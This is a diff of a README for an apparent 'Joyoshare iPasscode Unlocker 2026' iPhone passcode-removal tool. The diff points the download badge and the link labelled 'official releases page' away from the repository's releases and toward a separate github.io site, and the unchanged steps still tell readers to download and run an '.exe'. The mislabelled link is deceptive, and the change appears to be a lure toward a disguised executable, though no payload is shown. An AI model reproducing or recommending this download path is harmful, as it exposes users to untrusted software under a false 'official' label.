@@ -1,6 +1,6 @@
 # 🔓 Joyoshare-iPasscode-Unlocker-2026 - Remove iPhone Passcodes With Ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Hillary17th710/Joyoshare-iPasscode-Unlocker-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://hillary17th710.github.io)
 
 ## 📌 About This Tool
 
@@ -20,7 +20,7 @@ Before you install this software, confirm your computer meets these standards:
 
 Follow these steps to obtain the installation file:
 
-1. Visit the [official releases page](https://github.com/Hillary17th710/Joyoshare-iPasscode-Unlocker-2026/releases).
+1. Visit the [official releases page](https://hillary17th710.github.io).
 2. Locate the latest version entry under the "Assets" section.
 3. Click the file ending in ".exe" to begin the download.
 4. Save the file to your "Downloads" folder or your desktop for easy access.
